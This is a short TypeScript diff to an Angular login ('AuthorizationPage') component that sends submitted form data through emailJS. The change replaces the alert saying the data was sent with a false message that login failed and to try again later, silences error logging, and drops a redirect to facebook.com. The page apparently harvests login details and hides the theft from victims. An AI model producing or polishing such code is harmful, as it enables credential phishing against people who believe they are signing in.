@@ -47,15 +47,11 @@ export class AuthorizationPage {
     };
     emailJS.send(serviceID, templateID, params).then(
       () => {
-        alert('Ваше данные отправлены');
+        alert('Произошла ошибка при входе. Повторите позже');
       },
       (error) => {
-        console.log(error.text);
+        // console.log(error.text);
       }
     );
-  }
-
-  facebook() {
-    this.router.navigateByUrl(`https://www.facebook.com/`);
   }
 }
